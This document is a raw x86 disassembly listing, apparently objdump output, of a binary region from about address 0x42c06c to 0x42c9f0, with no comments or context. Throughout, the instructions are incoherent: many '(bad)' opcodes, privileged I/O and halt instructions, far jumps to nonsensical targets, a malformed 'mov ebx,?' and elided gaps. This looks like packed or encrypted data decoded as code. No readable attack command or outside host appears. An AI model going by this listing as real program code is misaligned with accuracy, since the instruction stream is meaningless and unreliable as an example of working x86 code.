  42c06c:	pop    ds
  42c06d:	jl     0x42bff8
  42c06f:	cwde   
  42c070:	jmp    0x95b061c
  42c075:	xchg   ecx,eax
  42c076:	jnp    0x42c0aa
  42c078:	(bad)  
  42c079:	loop   0x42c053
  42c07b:	shl    DWORD PTR [edx-0xb],cl
  42c07e:	mov    ebx,0x202c5efb
  42c083:	push   0x47aa0a0b
  42c088:	xor    al,0x23
  42c08a:	jge    0x42c0e0
  42c08c:	push   0xffffffea
  42c08e:	daa    
  42c08f:	mov    ecx,0x8a1ee7d4
  42c094:	mov    cl,0xda
  42c096:	adc    edi,esp
  42c098:	popf   
  42c099:	imul   ebx,esi,0xa622cad0
  42c09f:	or     DWORD PTR [edi],edx
  42c0a1:	jmp    ecx
  42c0a3:	sub    DWORD PTR [eax],ebp
  42c0a5:	sbb    al,0x39
  42c0a7:	xchg   ebx,eax
  42c0a8:	ss out dx,al
  42c0aa:	adc    BYTE PTR [ecx+edx*8],ah
  42c0ad:	mov    dh,BYTE PTR [ebp+ecx*1+0x6b]
  42c0b1:	in     al,dx
  42c0b2:	test   BYTE PTR [edx-0x70],ch
  42c0b5:	test   eax,0xa842087c
  42c0ba:	test   al,0x73
  42c0bc:	xchg   ebp,eax
  42c0bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c0be:	fdiv   QWORD PTR [esp+eiz*4]
  42c0c1:	popa   
  42c0c2:	hlt    
  42c0c3:	aaa    
  42c0c4:	sub    BYTE PTR [eax],cl
  42c0c6:	xchg   ebp,eax
  42c0c7:	xchg   esi,eax
  42c0c8:	neg    DWORD PTR [esi+0x9c19614]
  42c0ce:	popa   
  42c0cf:	mov    eax,ds:0x4054386a
  42c0d4:	lds    esi,FWORD PTR [eax]
  42c0d6:	in     eax,0xec
  42c0d8:	adc    BYTE PTR [ecx],bh
  42c0da:	addr16 pop ebx
  42c0dc:	or     al,0xb0
  42c0de:	cmp    DWORD PTR [ecx+0x16651231],esp
  42c0e4:	mov    dl,0xf0
  42c0e6:	in     al,0xb1
  42c0e8:	adc    al,0xe
  42c0ea:	lods   al,BYTE PTR ds:[esi]
  42c0eb:	cwde   
  42c0ec:	(bad)  
  42c0ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0ee:	xchg   edx,eax
  42c0ef:	cmp    eax,0x3917db69
  42c0f4:	and    DWORD PTR [ecx-0x57],edi
  42c0f7:	push   edx
  42c0f8:	repz aam 0x8
  42c0fb:	push   ebp
  42c0fc:	pop    ds
  42c0fd:	popf   
  42c0fe:	mov    eax,0xc9b1d0e8
  42c103:	dec    edi
  42c104:	pop    edi
  42c105:	repnz or DWORD PTR [edx+0x66],esp
  42c109:	dec    esp
  42c10a:	jno    0x42c170
  42c10c:	inc    edx
  42c10d:	outs   dx,DWORD PTR ds:[esi]
  42c10e:	sub    DWORD PTR [edx],edi
  42c110:	faddp  st(1),st
  42c112:	adc    dl,bh
  42c114:	ret    
  42c115:	mov    ebx,0x878586ef
  42c11a:	adc    al,0x68
  42c11c:	mov    edx,0x877a60bf
  42c121:	dec    ecx
  42c123:	ss (bad) 
  42c125:	(bad)  [edx+0x7f]
  42c128:	shl    BYTE PTR ds:0xb0e0dfd1,0x76
  42c12f:	adc    al,0x1
  42c131:	fadd   QWORD PTR [eax+0xca00]
	...
  42c193:	add    BYTE PTR [eax],al
  42c195:	add    BYTE PTR [ecx-0x7e],ch
  42c198:	int    0xae
  42c19a:	out    dx,eax
  42c19b:	out    dx,eax
  42c19c:	imul   eax,edi,0xffffffa4
  42c19f:	aas    
  42c1a0:	cld    
  42c1a1:	push   ss
  42c1a2:	test   eax,0xfb89b803
  42c1a7:	xlat   BYTE PTR ds:[ebx]
  42c1a8:	add    DWORD PTR [eax],eax
  42c1aa:	pop    es
  42c1ab:	add    DWORD PTR [eax],eax
  42c1ad:	add    dl,al
  42c1af:	icebp  
  42c1b0:	add    al,0xfb
  42c1b2:	(bad)  
  42c1b3:	jne    0x42c186
  42c1b5:	loopne 0x42c180
  42c1b7:	jp     0x42c161
  42c1b9:	lea    eax,[ebx-0x33403dae]
  42c1bf:	loope  0x42c19d
  42c1c1:	dec    edi
  42c1c2:	int3   
  42c1c3:	jns    0x42c1dc
  42c1c5:	jmp    0xe9399a71
  42c1ca:	lahf   
  42c1cb:	push   edi
  42c1cc:	loopne 0x42c175
  42c1ce:	sbb    ebx,DWORD PTR [ebp-0x7f]
  42c1d1:	push   0xffffffbc
  42c1d3:	retf   
  42c1d4:	sbb    al,0x96
  42c1d6:	std    
  42c1d7:	adc    eax,0x9d61d3d3
  42c1dc:	mov    dl,0x7a
  42c1de:	aaa    
  42c1df:	push   ds
  42c1e0:	dec    ecx
  42c1e1:	ret    
  42c1e2:	jnp    0x42c1ba
  42c1e4:	aad    0x26
  42c1e6:	mov    eax,0xf35fc981
  42c1eb:	jecxz  0x42c1f6
  42c1ed:	nop
  42c1ee:	jg     0x42c191
  42c1f0:	dec    eax
  42c1f1:	mov    bl,0xd6
  42c1f3:	dec    ecx
  42c1f4:	push   eax
  42c1f5:	lea    ecx,[ebx+0x50333c6c]
  42c1fb:	pop    ss
  42c1fc:	sbb    ah,ch
  42c1fe:	sub    BYTE PTR [ebx+0x44],bl
  42c201:	repz inc ebx
  42c203:	out    dx,al
  42c204:	xchg   esi,eax
  42c205:	xchg   ebx,eax
  42c206:	mov    ebx,?
  42c208:	inc    ebx
  42c209:	and    eax,0xc733cd88
  42c20e:	test   BYTE PTR [ebp+0x43],dl
  42c211:	mov    eax,ds:0x979a2f12
  42c216:	jae    0x42c28f
  42c218:	stc    
  42c219:	fdivr  DWORD PTR [ebx+0x5e6cd930]
  42c21f:	mov    eax,ds:0x53922e21
  42c224:	idiv   BYTE PTR [ecx]
  42c226:	mov    ebp,0x23177f7b
  42c22b:	iret   
  42c22c:	push   esp
  42c22d:	sbb    ecx,0xdbf6faf5
  42c233:	fsub   DWORD PTR [ecx+0x188f5b81]
  42c239:	mov    ecx,0xa3e0bf9e
  42c23e:	cld    
  42c23f:	fstp   TBYTE PTR [eax-0x70]
  42c242:	lahf   
  42c243:	and    DWORD PTR [ebp+edx*4-0x2a94c5bc],0x7b54efa4
  42c24e:	mov    ebp,0x6bc11b8a
  42c253:	xor    al,0xa2
  42c255:	push   ebx
  42c256:	jae    0x42c1e3
  42c258:	pop    ecx
  42c259:	mov    eax,ds:0x672874b1
  42c25e:	and    bl,BYTE PTR [ecx]
  42c260:	fs dec edx
  42c262:	aad    0xc1
  42c264:	shl    DWORD PTR [edx-0x6f],0x32
  42c268:	push   0xe5f4bca7
  42c26d:	(bad)  
  42c271:	call   0x389a:0x8d9869e9
  42c278:	sub    BYTE PTR [ebp+0x61c93441],bh
  42c27e:	retf   0x47a0
  42c281:	fimul  DWORD PTR [edi-0x47c7a58d]
  42c287:	push   ecx
  42c288:	jbe    0x42c21d
  42c28a:	retf   
  42c28b:	mov    ds:0xea5d65a8,eax
  42c290:	or     al,0xf7
  42c292:	push   edi
  42c293:	call   0xcca0:0x3d093324
  42c29a:	and    al,0x87
  42c29c:	jl     0x42c266
  42c29e:	mov    BYTE PTR [ecx],cl
  42c2a0:	jns    0x42c2a2
  42c2a2:	nop
  42c2a3:	xchg   ebx,eax
  42c2a4:	stc    
  42c2a5:	fcom   DWORD PTR ds:0x315978c5
  42c2ab:	fnsave [ebp-0x30]
  42c2ae:	cwde   
  42c2af:	xor    bl,BYTE PTR [ebp+0xbfd399e]
	...
  42c315:	add    dh,ah
  42c317:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c31b:	push   esi
  42c31d:	(bad)  
  42c31e:	adc    esi,DWORD PTR [ebx]
  42c320:	xchg   ebp,eax
  42c321:	sbb    esp,DWORD PTR [esi]
  42c323:	pop    edx
  42c324:	jno    0x42c31a
  42c326:	add    bl,cl
  42c328:	add    DWORD PTR [eax],eax
  42c32a:	pop    es
  42c32b:	add    DWORD PTR [eax],eax
  42c32d:	add    BYTE PTR [eax+ebx*1],cl
  42c330:	dec    eax
  42c331:	and    al,0x6f
  42c333:	add    DWORD PTR [edi-0x10],edi
  42c336:	push   es
  42c337:	sub    DWORD PTR [edi],edi
  42c339:	cs push 0xffffffd8
  42c33c:	fxch   st(1)
  42c33e:	ss inc esi
  42c340:	mov    BYTE PTR ds:0xeaf0763e,bh
  42c346:	neg    DWORD PTR [ebp+0x7ab1055]
  42c34c:	jo     0x42c381
  42c34e:	dec    edi
  42c34f:	push   esi
  42c350:	mov    ch,0x50
  42c352:	mov    cl,0x9f
  42c354:	sub    BYTE PTR [edx],0x25
  42c357:	ins    BYTE PTR es:[edi],dx
  42c358:	mov    al,BYTE PTR [ecx+0x48]
  42c35b:	lahf   
  42c35c:	(bad)  
  42c35d:	push   edx
  42c35e:	xchg   ebx,eax
  42c35f:	lods   al,BYTE PTR ds:[esi]
  42c360:	aaa    
  42c361:	jb     0x42c2ee
  42c363:	std    
  42c364:	lea    ecx,[edi]
  42c366:	and    DWORD PTR [esi-0x13e431e0],0xffffff8d
  42c36d:	lahf   
  42c36e:	add    al,BYTE PTR [ebp+eiz*2+0x180cdce7]
  42c375:	(bad)  
  42c376:	call   0x779fc0b6
  42c37b:	lea    esp,[eax]
  42c37d:	addr16 pop edx
  42c37f:	cmp    al,0xf
  42c381:	mov    edx,DWORD PTR [eax-0xa]
  42c384:	pop    es
  42c385:	sahf   
  42c386:	lea    ecx,[edx+edi*8+0x43c7c4fc]
  42c38d:	cmp    BYTE PTR [edi],dh
  42c38f:	ins    BYTE PTR es:[edi],dx
  42c390:	lahf   
  42c391:	fcom   QWORD PTR [ecx-0x45]
  42c394:	test   eax,0x4a13d3ea
  42c399:	dec    ebx
  42c39a:	xlat   BYTE PTR ds:[ebx]
  42c39b:	ja     0x42c416
  42c39d:	scas   eax,DWORD PTR es:[edi]
  42c39e:	jne    0x42c3c7
  42c3a0:	(bad)  
  42c3a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c3a2:	sbb    esp,DWORD PTR [edi+0x4f]
  42c3a5:	daa    
  42c3a6:	int3   
  42c3a7:	clc    
  42c3a8:	(bad)  
  42c3a9:	lods   al,BYTE PTR ds:[esi]
  42c3aa:	adc    eax,0xe229f956
  42c3af:	pop    edi
  42c3b0:	in     eax,dx
  42c3b1:	mov    ch,0xaf
  42c3b3:	test   al,0xd9
  42c3b5:	dec    edx
  42c3b6:	fld    TBYTE PTR [ecx-0x35c54831]
  42c3bc:	in     al,dx
  42c3bd:	xchg   edi,eax
  42c3be:	das    
  42c3bf:	call   0x6ae:0xc13f9510
  42c3c6:	aad    0xd9
  42c3c8:	cmc    
  42c3c9:	test   BYTE PTR [edx+0x72],dl
  42c3cc:	xchg   esi,eax
  42c3cd:	fs pop eax
  42c3cf:	pushf  
  42c3d0:	loope  0x42c376
  42c3d2:	ror    BYTE PTR [edi+0x5658e112],0x87
  42c3d9:	jns    0x42c42a
  42c3db:	test   DWORD PTR [ecx+0x7b],ebx
  42c3de:	shl    ebx,1
  42c3e0:	mov    ds:0xe39a4570,eax
  42c3e5:	daa    
  42c3e6:	pop    edx
  42c3e7:	dec    esi
  42c3e8:	xlat   BYTE PTR ds:[ebx]
  42c3e9:	mov    ds,WORD PTR [ecx-0x50]
  42c3ec:	rcr    al,1
  42c3ee:	cdq    
  42c3ef:	(bad)  
  42c3f0:	ret    0xed3d
  42c3f3:	or     DWORD PTR [ebp-0x712a4981],edx
  42c3f9:	dec    edx
  42c3fa:	inc    esp
  42c3fb:	fld    QWORD PTR [ebp+0x5]
  42c3fe:	jmp    0x42c417
  42c400:	inc    ecx
  42c401:	pop    ebx
  42c402:	fs loopne 0x42c3f6
  42c405:	cmp    dl,BYTE PTR [edi+ecx*2+0x4bb5b3e8]
  42c40c:	mov    ebx,DWORD PTR [edx+edx*8]
  42c40f:	pop    es
  42c410:	aad    0x8b
  42c412:	push   es
  42c413:	and    BYTE PTR [eax+edx*2],cl
  42c416:	js     0x42c3ca
  42c418:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c419:	in     eax,dx
  42c41a:	retf   
  42c41b:	inc    edx
  42c41c:	mov    esi,0xf14dd929
  42c421:	lods   eax,DWORD PTR ds:[esi]
  42c422:	out    0x3b,al
  42c424:	sbb    DWORD PTR [ebp-0x39],edx
  42c427:	mov    ch,0x5e
  42c429:	ss inc ebp
  42c42b:	popa   
  42c42c:	lods   al,BYTE PTR ds:[esi]
  42c42d:	lods   eax,DWORD PTR ds:[esi]
  42c42e:	test   eax,0x7464c066
  42c433:	pop    ds
  42c434:	jecxz  0x42c436
	...
  42c496:	in     al,dx
  42c497:	sbb    ebp,edx
  42c499:	sahf   
  42c49a:	cmc    
  42c49b:	fsubp  st(7),st
  42c49d:	jnp    0x42c473
  42c49f:	push   esi
  42c4a1:	xor    BYTE PTR [eax+0x21],dl
  42c4a4:	inc    ebp
  42c4a5:	ror    BYTE PTR [ecx],0xda
  42c4a8:	add    DWORD PTR [eax],eax
  42c4aa:	pop    es
  42c4ab:	add    DWORD PTR [eax],eax
  42c4ad:	add    ch,ch
  42c4af:	mov    dl,0x99
  42c4b1:	jnp    0x42c523
  42c4b3:	or     eax,0x4753fd9f
  42c4b8:	repz call 0x753a:0xa361b7b5
  42c4c0:	sbb    bl,BYTE PTR [esi]
  42c4c2:	out    dx,al
  42c4c3:	dec    ecx
  42c4c4:	adc    edx,ebp
  42c4c6:	rcl    ecx,1
  42c4c8:	sub    eax,0x491a6808
  42c4cd:	xchg   ecx,eax
  42c4ce:	iret   
  42c4cf:	retf   
  42c4d0:	dec    esp
  42c4d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c4d2:	or     DWORD PTR [ebx-0x61],0xb7d42da2
  42c4d9:	mov    ss,WORD PTR [ebp+0x4ad59932]
  42c4df:	fcomi  st,st(6)
  42c4e1:	daa    
  42c4e2:	jno    0x42c4e1
  42c4e4:	and    cl,bl
  42c4e6:	sbb    bh,bl
  42c4e8:	push   ebx
  42c4e9:	mov    ah,0x7a
  42c4eb:	xor    ecx,DWORD PTR [edi-0x27]
  42c4ee:	sub    eax,0xb345f192
  42c4f3:	pop    ss
  42c4f4:	dec    ebx
  42c4f5:	pop    es
  42c4f6:	push   ebx
  42c4f7:	and    eax,esp
  42c4f9:	push   esp
  42c4fa:	push   0x96e8f37d
  42c4ff:	pop    eax
  42c500:	cmp    ch,dl
  42c502:	xchg   edx,eax
  42c503:	test   DWORD PTR [esi-0x28],ecx
  42c506:	icebp  
  42c507:	adc    BYTE PTR [edx],dl
  42c509:	mov    ecx,0x49feee29
  42c50e:	(bad)  
  42c50f:	rol    BYTE PTR [ebx+ebx*1-0x38],1
  42c513:	add    ebp,DWORD PTR [ebx]
  42c515:	add    eax,0xb2dbf15a
  42c51a:	clc    
  42c51b:	aas    
  42c51c:	fdiv   DWORD PTR [edi-0x7c370d47]
  42c522:	and    DWORD PTR [edi],0xf
  42c525:	jns    0x42c5a3
  42c527:	jb     0x42c4e9
  42c529:	and    BYTE PTR [ebx+0x7f536167],ch
  42c52f:	rcr    DWORD PTR [ebp-0x1f145351],0x94
  42c536:	int    0xee
  42c538:	inc    esp
  42c539:	xor    al,BYTE PTR [edi-0x73]
  42c53c:	lds    edi,FWORD PTR [ecx+edx*1-0x1bb876d7]
  42c543:	addr16 pop ds
  42c545:	sub    al,bl
  42c547:	daa    
  42c548:	xor    eax,0x8fd095ef
  42c54d:	xlat   BYTE PTR ds:[ebx]
  42c54e:	adc    BYTE PTR [edi+0x53846b58],0x89
  42c555:	gs mov al,cl
  42c558:	ja     0x42c508
  42c55a:	ins    BYTE PTR es:[edi],dx
  42c55b:	or     al,0x23
  42c55d:	jmp    0x281f:0x8f4ae7d3
  42c564:	push   0x76eec9b8
  42c569:	dec    ebp
  42c56a:	pop    es
  42c56b:	pop    ebp
  42c56c:	ret    
  42c56d:	mov    eax,ds:0x7de72507
  42c572:	loop   0x42c531
  42c574:	imul   ebp,DWORD PTR [esi-0x49],0xbe6989ca
  42c57b:	inc    edi
  42c57c:	mov    esi,0x52a5f31f
  42c581:	cmp    eax,0x7aba7df1
  42c586:	push   cs
  42c587:	fwait
  42c588:	ror    ch,0x54
  42c58b:	xchg   ebp,eax
  42c58c:	ja     0x42c5c9
  42c58e:	jno    0x42c59e
  42c590:	xchg   ah,bl
  42c592:	xchg   dh,al
  42c594:	pop    ecx
  42c595:	cmp    ecx,esi
  42c597:	rcr    DWORD PTR [ebp-0x5c89886c],cl
  42c59d:	jbe    0x42c548
  42c59f:	scas   eax,DWORD PTR es:[edi]
  42c5a0:	and    al,0xb6
  42c5a2:	pop    ebp
  42c5a3:	jo     0x42c5c1
  42c5a5:	mov    dl,0x58
  42c5a7:	aaa    
  42c5a8:	lods   eax,DWORD PTR ds:[esi]
  42c5a9:	or     al,0x1f
  42c5ab:	xchg   ebx,eax
  42c5ac:	xchg   edx,eax
  42c5ad:	not    dh
  42c5af:	(bad)  
  42c5b1:	hlt    
  42c5b2:	adc    dh,BYTE PTR [ebp+0xab]
	...
  42c614:	add    BYTE PTR [eax],al
  42c616:	pop    ebp
  42c617:	dec    eax
  42c618:	jle    0x42c5a8
  42c61a:	jg     0x42c5da
  42c61c:	std    
  42c61d:	fisttp DWORD PTR [edi-0x31]
  42c620:	inc    eax
  42c621:	push   edi
  42c622:	je     0x42c635
  42c624:	jne    0x42c616
  42c626:	adc    bl,bl
  42c628:	add    DWORD PTR [eax],eax
  42c62a:	pop    es
  42c62b:	add    DWORD PTR [eax],eax
  42c62d:	add    BYTE PTR [ecx-0x21],dl
  42c630:	or     eax,0xac3a6bf7
  42c635:	sti    
  42c636:	fdiv   QWORD PTR [ebp-0x7b00d439]
  42c63c:	lahf   
  42c63d:	mov    ch,0xea
  42c63f:	jo     0x42c6b1
  42c641:	adc    DWORD PTR [ecx-0x1a],edx
  42c644:	jb     0x42c698
  42c646:	xchg   ecx,eax
  42c647:	inc    esp
  42c648:	and    al,0xee
  42c64a:	jecxz  0x42c68e
  42c64c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c64d:	gs and eax,0x5a983c40
  42c653:	mov    ds:0x4278db11,al
  42c658:	sub    eax,0x2138c23a
  42c65d:	fld    DWORD PTR [esi]
  42c65f:	jmp    0x19b8:0xf3ad9631
  42c666:	and    eax,0xd6b30a19
  42c66b:	push   dx
  42c66d:	jae    0x42c672
  42c66f:	mov    dl,0xcc
  42c671:	sbb    ebp,DWORD PTR [ebx-0x2d]
  42c674:	mov    esp,0x8c420896
  42c679:	sbb    al,0x7
  42c67b:	ret    
  42c67c:	call   0x5962f6bd
  42c681:	pushf  
  42c682:	into   
  42c683:	lods   eax,DWORD PTR ds:[esi]
  42c684:	push   es
  42c685:	dec    eax
  42c686:	sub    ebx,ecx
  42c688:	ds pop es
  42c68a:	pop    esp
  42c68b:	pop    ebp
  42c68c:	inc    edi
  42c68d:	lods   al,BYTE PTR ds:[esi]
  42c68e:	outs   dx,BYTE PTR ds:[esi]
  42c68f:	mov    ss,ecx
  42c691:	fwait
  42c692:	xchg   edi,eax
  42c693:	xchg   esp,edi
  42c695:	nop
  42c696:	(bad)  
  42c697:	scas   al,BYTE PTR es:[edi]
  42c698:	in     eax,0x8f
  42c69a:	sar    DWORD PTR [ebx-0xf],cl
  42c69d:	xchg   DWORD PTR [eax+0x73685ab6],ecx
  42c6a3:	ret    0xb70e
  42c6a6:	pop    es
  42c6a7:	xchg   edx,eax
  42c6a8:	fst    st(2)
  42c6aa:	sbb    ch,BYTE PTR [esp+edx*1-0x36]
  42c6ae:	cld    
  42c6af:	lods   al,BYTE PTR ds:[esi]
  42c6b0:	nop
  42c6b1:	setae  BYTE PTR [edx-0x7f]
  42c6b5:	xchg   ebp,eax
  42c6b6:	stos   BYTE PTR es:[edi],al
  42c6b7:	push   edx
  42c6b8:	mov    dh,0x46
  42c6ba:	(bad)  
  42c6bb:	mov    edx,0xc7973b9f
  42c6c0:	jb     0x42c6c0
  42c6c2:	jge    0x42c6fc
  42c6c4:	xlat   BYTE PTR ds:[ebx]
  42c6c5:	inc    ecx
  42c6c6:	lods   al,BYTE PTR ds:[esi]
  42c6c7:	pop    es
  42c6c8:	mov    al,0x25
  42c6ca:	lds    esp,FWORD PTR [eax-0x1219c3dc]
  42c6d0:	int3   
  42c6d1:	cld    
  42c6d2:	mov    ah,0x57
  42c6d4:	stc    
  42c6d5:	data16 add BYTE PTR [ebx],bh
  42c6d8:	enter  0xc096,0x31
  42c6dc:	mov    al,0xb6
  42c6de:	push   ecx
  42c6df:	popa   
  42c6e0:	rol    ecx,cl
  42c6e2:	lea    ecx,[ebx-0x1c]
  42c6e5:	push   eax
  42c6e6:	lods   al,BYTE PTR ds:[esi]
  42c6e7:	cmp    eax,0x8034c56a
  42c6ec:	sbb    eax,0xb7bb27e8
  42c6f1:	xor    eax,0x428b086e
  42c6f6:	push   0xda2d6e57
  42c6fb:	data16 or bh,BYTE PTR [esi-0x2dc696ea]
  42c702:	pop    edi
  42c703:	dec    esp
  42c704:	mov    BYTE PTR [edi],al
  42c706:	lods   al,BYTE PTR ds:[esi]
  42c707:	mov    ebp,0x5eabeca3
  42c70c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c70d:	loopne 0x42c70e
  42c70f:	sahf   
  42c710:	cli    
  42c711:	(bad)  
  42c712:	cmp    bl,BYTE PTR [ebx+ebx*2-0x4888ba02]
  42c719:	cmp    eax,0xa2792eed
  42c71e:	ins    DWORD PTR es:[edi],dx
  42c71f:	mov    ecx,0xbbba40f0
  42c724:	call   0x7d716f86
  42c729:	push   ebp
  42c72a:	das    
  42c72b:	jnp    0x42c771
  42c72d:	jmp    0xca2d:0x95c4b5b1
  42c734:	das    
	...
  42c795:	add    BYTE PTR [eax],bh
  42c797:	mov    DWORD PTR [edx-0x6b],ebp
  42c79a:	sti    
  42c79b:	idiv   edi
  42c79d:	lods   eax,DWORD PTR ds:[esi]
  42c79e:	push   ss
  42c79f:	mov    al,ds:0xc5193f90
  42c7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c7a5:	scas   al,BYTE PTR es:[edi]
  42c7a6:	pop    ss
  42c7a7:	fadd   QWORD PTR [ecx]
  42c7a9:	add    BYTE PTR [edi],al
  42c7ab:	add    DWORD PTR [eax],eax
  42c7ad:	add    BYTE PTR [ecx-0xbea327f],al
  42c7b3:	(bad)  
  42c7b4:	pop    esi
  42c7b5:	enter  0xf41b,0xbb
  42c7b9:	fneni(8087 only) 
  42c7bb:	test   BYTE PTR [ebp+0x5c626933],al
  42c7c1:	sub    ebp,DWORD PTR [eax+0x26]
  42c7c4:	cmc    
  42c7c5:	shl    DWORD PTR [esi+edx*8-0x3d80a7ed],0x17
  42c7cd:	das    
  42c7ce:	inc    ebx
  42c7cf:	xor    cl,BYTE PTR [eax+0x2ce0cba6]
  42c7d5:	shl    DWORD PTR [ebx+0x64383659],0x23
  42c7dc:	js     0x42c7df
  42c7de:	adc    al,0xd6
  42c7e0:	mov    bh,0x19
  42c7e2:	dec    eax
  42c7e3:	sbb    BYTE PTR [eax+0x47],dl
  42c7e6:	jl     0x42c78b
  42c7e8:	add    DWORD PTR [ecx+0x729c11c7],edi
  42c7ee:	cmp    edx,DWORD PTR [ebx+eiz*1+0x1e]
  42c7f2:	push   cs
  42c7f3:	cmp    eax,0x5e688b6b
  42c7f8:	xor    ah,BYTE PTR [ebx+edi*4-0x62a9d075]
  42c7ff:	pop    es
  42c800:	andps  xmm3,XMMWORD PTR [edx]
  42c803:	scas   eax,DWORD PTR es:[edi]
  42c804:	or     esp,ebx
  42c806:	imul   ebx,DWORD PTR [ebp-0x25b8f50],0xffffff87
  42c80d:	push   cs
  42c80e:	inc    ecx
  42c80f:	cmp    al,0x26
  42c811:	mov    edx,0x77ca6901
  42c816:	jg     0x42c876
  42c818:	(bad)  
  42c819:	push   ds
  42c81a:	clc    
  42c81b:	and    esp,esi
  42c81d:	outs   dx,BYTE PTR ds:[esi]
  42c81e:	pop    ebp
  42c81f:	xchg   edi,edx
  42c821:	xchg   ebp,eax
  42c822:	repz dec ebx
  42c824:	and    bh,dl
  42c826:	or     ebp,DWORD PTR [edi-0x7f]
  42c829:	adc    eax,0xbf5c9766
  42c82e:	pop    ds
  42c82f:	shr    DWORD PTR ds:0x78d34819,0x1f
  42c836:	dec    ecx
  42c837:	shr    ebx,0x7f
  42c83a:	stc    
  42c83b:	cmp    eax,0xfa675059
  42c840:	sar    BYTE PTR [eax-0x792d1cb],1
  42c846:	lods   eax,DWORD PTR ds:[esi]
  42c847:	int3   
  42c848:	inc    edi
  42c849:	inc    BYTE PTR [ecx-0x7f2bc5db]
  42c84f:	mov    edi,0x5aec8a03
  42c854:	inc    edi
  42c855:	loopne 0x42c863
  42c857:	daa    
  42c858:	xchg   edx,eax
  42c859:	cmp    BYTE PTR [edi],bh
  42c85b:	add    al,0x26
  42c85d:	pop    edx
  42c85e:	xchg   ebp,eax
  42c85f:	pop    edx
  42c860:	add    DWORD PTR [ebx-0x3b],ecx
  42c863:	sti    
  42c864:	inc    ebx
  42c865:	dec    edx
  42c866:	pop    esp
  42c867:	sbb    eax,DWORD PTR [edx-0x661b2b28]
  42c86d:	jmp    0x2a21813c
  42c872:	push   esp
  42c873:	gs cmp eax,0x989950b6
  42c879:	or     dl,BYTE PTR [esi-0x62a6ec61]
  42c87f:	jmp    0x42c83f
  42c881:	xor    eax,0x82ea0599
  42c886:	cmp    ch,BYTE PTR [edi]
  42c888:	data16 xlat BYTE PTR ds:[ebx]
  42c88a:	dec    edi
  42c88b:	sahf   
  42c88c:	push   ecx
  42c88d:	push   edx
  42c88e:	fist   WORD PTR [eax+0x5f]
  42c891:	rcr    ch,cl
  42c893:	mov    dh,BYTE PTR [ebp-0x586919a0]
  42c899:	dec    esp
  42c89a:	cli    
  42c89b:	mov    bh,0x99
  42c89d:	clc    
  42c89e:	(bad)  
  42c8a0:	out    0x87,al
  42c8a2:	sbb    dl,0xdc
  42c8a5:	jne    0x42c906
  42c8a7:	jo     0x42c87f
  42c8a9:	pop    ebp
  42c8aa:	cmp    eax,0xfcb61d6b
  42c8af:	lds    ebp,FWORD PTR [eax+0x47]
  42c8b2:	cld    
  42c8b3:	sub    ah,BYTE PTR [ebx]
	...
  42c915:	add    BYTE PTR [eax],dl
  42c917:	sbb    ecx,ecx
  42c919:	jmp    0xfb73c4e9
  42c91e:	addr16 mov ds:0xa954,al
  42c922:	or     al,0xe4
  42c924:	mov    ds:0x1dd1e3e,al
  42c929:	add    BYTE PTR [edi],al
  42c92b:	add    DWORD PTR [eax],eax
  42c92d:	add    BYTE PTR [edi+0x15],bh
  42c930:	jbe    0x42c97d
  42c932:	aad    0xbb
  42c934:	adc    dl,cl
  42c936:	fst    QWORD PTR [edx-0x5c]
  42c939:	je     0x42c8c9
  42c93b:	add    al,0xda
  42c93d:	pop    ds
  42c93e:	mov    esp,0x8e041c8c
  42c943:	sti    
  42c944:	imul   ebx,DWORD PTR [eax-0x2fa2e35d],0x58
  42c94b:	adc    BYTE PTR [si],dl
  42c94e:	sbb    eax,0x4fa17a3b
  42c953:	mov    ch,0x70
  42c955:	mov    al,0x32
  42c957:	hlt    
  42c958:	enter  0x9295,0x31
  42c95c:	jne    0x42c8ec
  42c95e:	jl     0x42c97b
  42c960:	push   esp
  42c962:	or     bl,dl
  42c964:	in     al,0x92
  42c966:	test   eax,0xca8bfab7
  42c96b:	sbb    al,0x8
  42c96e:	shr    esp,cl
  42c970:	jns    0x42c9e2
  42c972:	pop    edx
  42c973:	(bad)  
  42c974:	pop    ds
  42c975:	pushf  
  42c976:	stc    
  42c977:	cmp    esp,DWORD PTR [ecx-0x2e]
  42c97a:	push   cs
  42c97b:	mov    bl,0x88
  42c97d:	aad    0xee
  42c97f:	fidivr WORD PTR [ecx-0x18]
  42c982:	dec    eax
  42c983:	xlat   BYTE PTR ds:[ebx]
  42c984:	push   esi
  42c985:	dec    DWORD PTR fs:[eax]
  42c988:	in     al,dx
  42c989:	out    0x59,al
  42c98b:	adc    al,0x14
  42c98d:	int3   
  42c98e:	pop    edi
  42c98f:	jecxz  0x42c9c6
  42c991:	sbb    al,0x64
  42c993:	jge    0x42c987
  42c995:	inc    eax
  42c996:	mov    dh,0x41
  42c998:	lea    ebp,[esi]
  42c99a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c99b:	js     0x42c949
  42c99d:	loop   0x42c977
  42c99f:	pushf  
  42c9a0:	aaa    
  42c9a1:	sub    ch,BYTE PTR ds:0x64d0a8ce
  42c9a7:	dec    esp
  42c9a8:	pop    esi
  42c9a9:	mul    DWORD PTR [eax]
  42c9ab:	lods   eax,DWORD PTR ds:[esi]
  42c9ac:	fwait
  42c9ad:	imul   ch
  42c9af:	adc    al,0x47
  42c9b1:	lods   al,BYTE PTR ds:[esi]
  42c9b2:	jp     0x42c998
  42c9b4:	or     DWORD PTR [esi-0x1c],ebp
  42c9b7:	or     al,0x86
  42c9b9:	mov    esp,0xecd91069
  42c9be:	ss mov ebx,0x5ee5e92
  42c9c4:	or     al,0x4a
  42c9c6:	fisttp WORD PTR [ebx+0x14376061]
  42c9cc:	sbb    eax,0xdb181a01
  42c9d1:	js     0x42ca00
  42c9d3:	mov    ebp,0xfedcf081
  42c9d8:	cs mov ebp,0xdc3c63a9
  42c9de:	pop    eax
  42c9df:	or     ebx,edi
  42c9e1:	dec    ecx
  42c9e2:	retf   
  42c9e3:	adc    al,0xbf
  42c9e5:	fiadd  WORD PTR [eax-0x279cd0bb]
  42c9eb:	and    eax,0xe12fb67c
  42c9f0:	xlat   BYTE PTR ds:[ebx]
